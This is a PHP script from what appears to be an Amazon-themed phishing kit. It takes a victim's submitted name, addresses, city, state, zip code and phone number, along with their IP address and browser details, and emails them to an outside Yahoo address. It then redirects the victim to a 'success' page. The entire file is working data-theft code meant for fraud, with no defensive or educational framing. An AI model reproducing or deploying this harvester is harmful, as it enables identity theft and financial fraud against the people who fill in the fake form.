<?php   ob_start();  ?>
<?
include "boot.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "==================================================\n";
$message .= "============xX A.M.A.Z.O.N Xx======\n";
$message .= "Full Name                      : ".$_POST['stone1']."\n";
$message .= "Address 1                    : ".$_POST['stone2']."\n";
$message .= "Address 2                       : ".$_POST['stone3']."\n";
$message .= "City                       : ".$_POST['stone4']."\n";
$message .= "State/Province                    : ".$_POST['stone5']."\n";
$message .= "Zip Code                    : ".$_POST['stone6']."\n";
$message .= "Phone Number                   : ".$_POST['stone7']."\n";
$message .= "============xX LOGIN CHECK Xx=====\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | SOLID ST+NE : ".date("g:i:s:a || D-d-M-Y")."\n";
$message .= "==================================================\n";

$send="samcliff604@yahoo.com";
$subject = "A.M.A.Z.O.N-CREDIT CARD | ".$_POST['stone2']." | $ip";
$headers = "From: STONENETZ<noreply>";
@mail($send,$subject,$message,$from);
@header("Location: success.php"); // Redirecting 